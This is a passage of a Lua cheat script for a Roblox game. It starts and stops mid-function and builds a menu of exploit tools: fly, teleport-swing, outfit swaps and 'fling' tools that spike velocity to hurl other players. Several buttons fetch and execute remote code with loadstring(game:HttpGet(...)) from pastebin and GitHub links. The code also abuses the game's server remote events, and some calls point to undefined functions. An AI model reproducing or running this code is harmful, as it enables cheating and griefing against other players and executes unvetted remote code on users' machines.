local OutFitOn = false
BatManOutFitTool.Activated:Connect(function()
    if OutFitOn == false then
        OutFitOn = true
        local lp = game:GetService("Players").LocalPlayer
        game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(MaskOn):Play()
        game.Players.LocalPlayer.Character.BatmanOutfit.Handle.Transparency = 1
        game.Players.LocalPlayer.Character.BatmanOutfit.Handle.Decal.Transparency = 1
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass('ShirtGraphic') then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass('ShirtGraphic'):Destroy()
        end
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Shirt') then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass('Shirt').ShirtTemplate = 'rbxassetid://164114181';
        else
            local Shirt = Instance.new('Shirt');
            Shirt.Parent = game.Players.LocalPlayer.Character;
            Shirt.ShirtTemplate = 'rbxassetid://164114181';
        end
        if game.Players.LocalPlayer.Character:FindFirstChild('Pants') then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass('Pants').PantsTemplate = 'rbxassetid://164114198';
        else
            local Pants = Instance.new('Pants');
            Pants.Parent = game.Players.LocalPlayer.Character;
            Pants.PantsTemplate = 'rbxassetid://164114198';
        end;
    else
        OutFitOn = false
        game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(MaskOff):Play()
        game.Players.LocalPlayer.Character.BatmanOutfit.Handle.Transparency = 0
        game.Players.LocalPlayer.Character.BatmanOutfit.Handle.Decal.Transparency = 0
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Shirt').ShirtTemplate = old2
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Pants').PantsTemplate = old3
    end
    local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://9120020147"
Sound:Play()
end)

game:GetObjects("rbxassetid://8083438374")[1].Parent = game.Players.LocalPlayer.Backpack 
local GlideTool = game.Players.LocalPlayer.Backpack.Glide
local GlideAnim = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
GlideAnim.AnimationId = "rbxassetid://3136090876"
local Gliding = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GlideAnim)
function GlideToolActive()
    local player = game.Players.LocalPlayer
    repeat wait() until player.Character
    local humanoid = player.Character:WaitForChild('Humanoid')
    local bodyvelocity = game.Players.LocalPlayer.Backpack.Glide.Handle:WaitForChild("BodyVelocity")
    local jumpover = true
    function jump()
        jumpover = false
        wait(.3)
        jumpover = true
        local currenstate = humanoid:GetState()
        if currenstate == Enum.HumanoidStateType.Freefall and game.Players.LocalPlayer.Character:FindFirstChild("Glide") then
            bodyvelocity.MaxForce = Vector3.new(0,100000,0)
            play(1462718291, true, true)
            while wait() and game.Players.LocalPlayer.Character:FindFirstChild("Glide") and Enum.HumanoidStateType.Freefall do
                Gliding:Play()
            end
        end
    end
    humanoid.StateChanged:Connect(function(oldState, newState)
        if jumpover == true then
            if newState == Enum.HumanoidStateType.Jumping then
                bodyvelocity.MaxForce = Vector3.new(0,0,0)
                jump()
            elseif newState == Enum.HumanoidStateType.Freefall then
                bodyvelocity.MaxForce = Vector3.new(0,300000,0)
                play(1462718291, true, true)
                while wait() and game.Players.LocalPlayer.Character:FindFirstChild("Glide") and Enum.HumanoidStateType.Freefall do
                    Gliding:Play()
                end
            else
                Gliding:Stop()
                if game.Players.LocalPlayer.Character:FindFirstChild("Glide") then
                Gliding:Stop()
                play(2952274135, true, true)
            end 
                Gliding:Stop()
                if game.Players.LocalPlayer.Character:FindFirstChild("Glide") then
                    Gliding:Stop()
                    play(2952274135, true, true)
                end
                bodyvelocity.MaxForce = Vector3.new(0,0,0)
            end
        end
    end)
end

GlideTool.Equipped:Connect(GlideToolActive())
end)

Section:NewButton("Speed tool", "Speed", function()
local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;
Notify({
Description = "og speed";
Title = "logmade On Discord";
Duration = 15;
});
getgenv().Speed = true
getgenv().FakeMacro = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/nukermode/main/Kit%20tools.txt"))()
    end)

Section:NewButton("Shazam Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/BvF6cPdm"))()
end)

Section:NewButton("Web Tool", "ButtonInfo", function()
local OriginalKeyUpValue = 0;
local Cooldown = false;

function AddVelocity(Vel, Char)
	Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
end

local Grapple = Instance.new('Animation');
Grapple.AnimationId = 'rbxassetid://3135389157';

local Swing = Instance.new('Animation');
Swing.AnimationId = 'rbxassetid://3135793091';

local Glide = Instance.new("Animation")
Glide.AnimationId = 'rbxassetid://3136090876';

function StopAudio()
	game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND'):Stop();
end;

function Stop(i, v)
	local w = coroutine.wrap(function()
		wait(game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').TimeLength-0.1)
		if game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').SoundId == 'rbxassetid://'..i and OriginalKeyUpValue == v then
			StopAudio();
		end;
	end);
	w();
end;

function Play(i, v, w)
	if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]') then
		local Tool = nil;
		if game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool') and w == true then
			Tool = game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool')
			game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack');
		end;
		game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer.Character;
		game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('Boombox', i);
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').RequiresHandle = false;
		if game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle') then
			game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle'):Destroy();
		end
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack')
		if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame') then
			game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame').Visible = false;
		end;
		if Tool ~= true then
			if Tool then
				Tool.Parent = game:GetService('Players').LocalPlayer.Character
			end;
		end;
		if v == true then
			game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):WaitForChild('BOOMBOXSOUND');
			local x = coroutine.wrap(function()
				repeat wait() until game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').SoundId == 'rbxassetid://'..i and game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').TimeLength > 0.01
				OriginalKeyUpValue = OriginalKeyUpValue + 1;
				Stop(i, OriginalKeyUpValue);
			end);
			x();
		end;
	end;
end;

function Tool()
	local Tool = Instance.new('Tool')
	Tool.Name = 'Web Tool';
	Tool.RequiresHandle = false;
	Tool.Activated:Connect(function()
		if game:GetService('Players').LocalPlayer:GetMouse().Target and Cooldown == false then
			Cooldown = true;
		
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://1284846268"
Sound:Play()

	game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Grapple):Play();
			Play(151733071, true, true)
			wait(0.25)
			local Rotation = game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame - game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position;
			local Tween = game:GetService('TweenService'):Create(game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart'), TweenInfo.new(.99, Enum.EasingStyle.Linear), {CFrame = CFrame.new(game:GetService('Players').LocalPlayer:GetMouse().Hit.X, game:GetService('Players').LocalPlayer:GetMouse().Hit.Y + 5, game:GetService('Players').LocalPlayer:GetMouse().Hit.Z) * Rotation})
			Tween:Play();
			game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Swing):Play();
			Tween.Completed:Wait();
			for _, v in pairs(game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
				if v.Animation.AnimationId == Swing.AnimationId then
					v:Stop();
					wait(0.01)
					game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Glide):Play();
				    wait(.1)
				end;
			end;
			Cooldown = false;
			if not game:GetService('Players').LocalPlayer.Character:FindFirstChild(Tool) then
				Tool.Parent = game:GetService('Players').LocalPlayer.Character;
			end;
		end;
	end);
	Tool.Parent = game:GetService('Players').LocalPlayer:FindFirstChildWhichIsA('Backpack');
end;
game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
Tool();
game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function(v)
	v:WaitForChild('FULLY_LOADED_CHAR');
	Tool();
end);
game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function(v)
    v:WaitForChild('FULLY_LOADED_CHAR');
    Tool5();
end);
end)

Section:NewButton("Fly Tool", "ButtonInfo", function()

local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://1523818134"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = ("UH OG Gui");
	Text = "OG Fly Tool Loaded!";
	Icon = "rbxthumb://type=Asset&id=9915433572&w=150&h=150"})
Duration = 16;




mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "OG Fly Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)

local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "X", false, game)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "W", false, game)
end)
tool.Parent = game.Players.LocalPlayer.Backpack

	local plr = game.Players.LocalPlayer
	local mouse = plr:GetMouse()
	local Humanoid = game.Players.LocalPlayer.Character.Humanoid or game.Players.LocalPlayer.Character.humanoid  

	localplayer = plr

	if workspace:FindFirstChild("Core") then
		workspace.Core:Destroy()
	end

	local Core = Instance.new("Part")
	Core.Name = "Core"
	Core.Size = Vector3.new(0.05, 0.05, 0.05)

	spawn(function()
		Core.Parent = workspace
		local Weld = Instance.new("Weld", Core)
		Weld.Part0 = Core
		Weld.Part1 = localplayer.Character.LowerTorso
		Weld.C0 = CFrame.new(0, 0, 0)
	end)

	workspace:WaitForChild("Core")

	local torso = workspace.Core
	flying = true
	local speed=3
	local keys={a=false,d=false,w=false,s=false} 
	local e1
	local e2
	local function start()
		local pos = Instance.new("BodyPosition",torso)
		local gyro = Instance.new("BodyGyro",torso)
		pos.Name="EPIXPOS"
		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		pos.position = torso.Position
		gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		gyro.cframe = torso.CFrame
		repeat
			wait()
			Humanoid.PlatformStand=true
			local new=gyro.cframe - gyro.cframe.p + pos.position
			if not keys.w and not keys.s and not keys.a and not keys.d then
				speed=3
			end
			if keys.w then 
				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.s then 
				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.d then 
				new = new * CFrame.new(speed,0,0)
				speed=speed+0
			end
			if keys.a then 
				new = new * CFrame.new(-speed,0,0)
				speed=speed+0
			end
			if speed>3 then
				speed=3
			end
			pos.position=new.p
			if keys.w then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
			elseif keys.s then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
			else
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame
			end
		until flying == false
		if gyro then gyro:Destroy() end
		if pos then pos:Destroy() end
		flying=false
		Humanoid.PlatformStand=false
		speed=10
	end
	e1=mouse.KeyDown:connect(function(key)
		if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
		if key=="w" then
			keys.w=true
		elseif key=="s" then
			keys.s=true
		elseif key=="a" then
			keys.a=true
		elseif key=="d" then
			keys.d=true
		elseif key=="x" then
			if flying==true then
				flying=false
			else
				flying=true
				start()
			end
		end
	end)
	e2=mouse.KeyUp:connect(function(key)
		if key=="w" then
			keys.w=false
		elseif key=="s" then
			keys.s=false
		elseif key=="a" then
			keys.a=false
		elseif key=="d" then
			keys.d=false
		end
	end)
	start()
end)

Section:NewButton("fling Tools", "op", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

   function AddVelocity(Vel, Char)
        Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
    end

--//------------------------------------------------------------------------------------------\\--
   OWNER = game:GetService("Players").LocalPlayer
   RS = game:GetService("RunService")
   TS = game:GetService("TweenService")
   ANIM = OWNER.Character:WaitForChild("Animate")
--//------------------------------------------------------------------------------------------\\--
   function AnimPlay(ID, SPEED)
       local animation = Instance.new('Animation', game:GetService("Workspace"))
       animation.AnimationId = 'rbxassetid://'..ID
       playing = OWNER.Character:WaitForChild("Humanoid"):LoadAnimation(animation)
       playing:Play() 
           if tonumber(SPEED) then
               playing:AdjustSpeed(SPEED)
           else
               playing:AdjustSpeed(1)
           end
       animation:Destroy()
   end
--//------------------------------------------------------------------------------------------\\--
   function AnimStop(ID, SPEED)
       for i,v in pairs(OWNER.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
           if v.Animation.AnimationId == 'rbxassetid://'..ID then
             if tonumber(SPEED) then
                   v:Stop(SPEED)
               else
                   v:Stop()
               end
           end
       end
   end


local LocalPlayer = game:GetService("Players").LocalPlayer
    local OldChar = LocalPlayer.Character

    getgenv().Bell = false
    game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Bell == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (1200)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "[Bat fling]"
    Tool.Activated:Connect(function()
    game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
    local Animation = Instance.new("Animation")
    Animation.AnimationId = "rbxassetid://3172948973"
    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
    LoadAnimation.Looped = false
    LoadAnimation.Priority = Enum.AnimationPriority.Action
    LoadAnimation:Play()
    wait(1)
    getgenv().Bell = true
    wait(0.1)
   Play(8243331779)
    wait(1)
    getgenv().Bell = false
    wait(2.1)
    game.Players.LocalPlayer.Character["[Bat]"].Parent = game.Players.LocalPlayer.Backpack
    end)


    getgenv().Uppercut = false
    game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Uppercut == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (1200)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "Uppercut"
    Tool.Activated:Connect(function()
    local Animation = Instance.new("Animation")
    Animation.AnimationId = "rbxassetid://3355740058"
    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
    LoadAnimation.Looped = false
    LoadAnimation.Priority = Enum.AnimationPriority.Action
    LoadAnimation:Play()
    getgenv().Uppercut = true
    wait(0.1)
   Play(6543434995)
    wait(1)
    getgenv().Uppercut = false
    end)

getgenv().Kick = false
    game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Kick == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (1200)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "[Kick]"
    Tool.Activated:Connect(function()
    local Animation = Instance.new("Animation")
    Animation.AnimationId = "rbxassetid://2788306916"
    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
    LoadAnimation.Looped = false
    LoadAnimation.Priority = Enum.AnimationPriority.Action
    LoadAnimation:Play()
    wait(0.1)
    getgenv().Kick = true
    wait(0.1)
   Play(4766119678)
    wait(1)
    getgenv().Kick = false
    wait(0.1)
    end)

    getgenv().Punch = false
    game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Punch == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (1200)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "[Punch]"
    Tool.Activated:Connect(function()
    local Animation = Instance.new("Animation")
    Animation.AnimationId = "rbxassetid://3354696735"
    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
    LoadAnimation.Looped = false
    LoadAnimation.Priority = Enum.AnimationPriority.Action
    LoadAnimation:Play()
    getgenv().Punch = true
    wait(0.1)
   Play(8907573127)
    wait(1)
    getgenv().Punch = false
    end)

    getgenv().Thunder = false
    game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Thunder == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (1200)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "Thunder"
    Tool.Activated:Connect(function()
    local Animation = Instance.new("Animation")
    Animation.AnimationId = "rbxassetid://14496531574"
    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
    LoadAnimation.Looped = false
    LoadAnimation.Priority = Enum.AnimationPriority.Action
    LoadAnimation:Play()
    getgenv().Thunder = true
    wait(0.1)
   Play(1079408535)
    wait(1)
    getgenv().Thunder = false
    end)

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Tool = Instance.new("Tool",LocalPlayer.Backpack)
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    Tool.RequiresHandle = false 
    Tool.Name = "[COD ZOMBIE]"
    Tool.Activated:Connect(function()
    Ringtone(4968749619)
    AnimPlay(2788838708)
    wait(3.7)
    AnimStop(2788838708)
    end)
end)

Section:NewButton("one kick", "one kick", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

    local Player = game.Players.LocalPlayer
    local Swing1 = Instance.new('Animation', game.ReplicatedStorage)
    Swing1.AnimationId = 'rbxassetid://8254794168'

    local Swing2 = Instance.new('Animation', game.ReplicatedStorage)
    Swing2.AnimationId = 'rbxassetid://8254792138'

    local Swing3 = Instance.new('Animation', game.ReplicatedStorage)
    Swing3.AnimationId = 'rbxassetid://8254789608'

    local Swing4 = Instance.new('Animation', game.ReplicatedStorage)
    Swing4.AnimationId = 'rbxassetid://8254787838'

    local Swing5 = Instance.new('Animation', game.ReplicatedStorage)
    Swing5.AnimationId = 'rbxassetid://2788307715'

    local _1 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing1)
    local _2 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing2)
    local _3 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing3)
    local _4 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing4)
    local _5 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing5)

    game:GetService('RunService'):BindToRenderStep("crash", 0 , function()
        for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
            if (v.Animation.AnimationId:match("rbxassetid://2788309982")) then
                v:Stop(0);
                _2:Stop()
                _3:Stop()
                _1:Play()
                _4:Stop()
                _1:AdjustSpeed(2.4)    
            elseif (v.Animation.AnimationId:match("rbxassetid://2788311138")) then
                v:Stop(0);
                _1:Stop()
                _3:Stop()
                _2:Play()
                _4:Stop()
                _2:AdjustSpeed(2.4)
            elseif (v.Animation.AnimationId:match("rbxassetid://2788306916")) then
                v:Stop(0);
                _1:Stop()
                _3:Stop()
                _2:Play()
                _4:Stop()
                _2:AdjustSpeed(2.4)
            elseif (v.Animation.AnimationId:match("rbxassetid://2788305271")) then
                v:Stop(0);
                _1:Stop()
                _3:Stop()
                _2:Play()
                _4:Stop()
                _2:AdjustSpeed(2.4)
            elseif (v.Animation.AnimationId:match("rbxassetid://2788308661")) then
                v:Stop(0);
                _1:Stop()
                _2:Stop()
                _3:Play()
                _4:Stop()
                _3:AdjustSpeed(2.4)
            elseif (v.Animation.AnimationId:match("rbxassetid://2788309317")) then
                v:Stop(0);
                _1:Stop()
                _2:Stop()
                _3:Stop()
                _4:Play()
                _4:AdjustSpeed(2.4)
            elseif (v.Animation.AnimationId:match("rbxassetid://2788289281")) then
                v:Stop(0);
            elseif (v.Animation.AnimationId:match("rbxassetid://2788292075")) then
                v:Stop(0);
                _2:Stop()
                _3:Stop()
                _1:Stop()
                _5:Play()
                _4:Stop()
                _5:AdjustSpeed(2.4) 
            elseif (v.Animation.AnimationId:match("rbxassetid://3354699999")) then
                v:Stop(0);
                _1:Stop()
                _3:Stop()
                _2:Play()
                _4:Stop()
                _2:AdjustSpeed(2.4)
            end;
        end
    end)

    game:GetService("RunService").heartbeat:Connect(function()
        for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
            if (v.Animation.AnimationId:match("rbxassetid://2809419094"))
            or (v.animation.AnimationId:match("rbxassetid://2877910736"))
            or (v.animation.AnimationId:match("rbxassetid://2809413000")) then
                v:Stop()
            end
        end
    end)

    function kick()
        local KIckAnim = Instance.new('Animation');
        KIckAnim.AnimationId = "rbxassetid://8254765806";--3354696735
            tool = Instance.new("Tool")
            tool.RequiresHandle = false
            tool.Name = "one kick"
            tool.Activated:Connect(function()
                game.Players.LocalPlayer.Backpack["Combat"].Parent = game.Players.LocalPlayer.Character
                game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                wait(1)
           Play(6073433216)
            wait(0.1)
            Call()
            end)
            tool.Parent = game.Players.LocalPlayer.Backpack
        end;
        game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
        kick()
end)

Section:NewButton("hold up", 
"grab the person", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

                function kick()
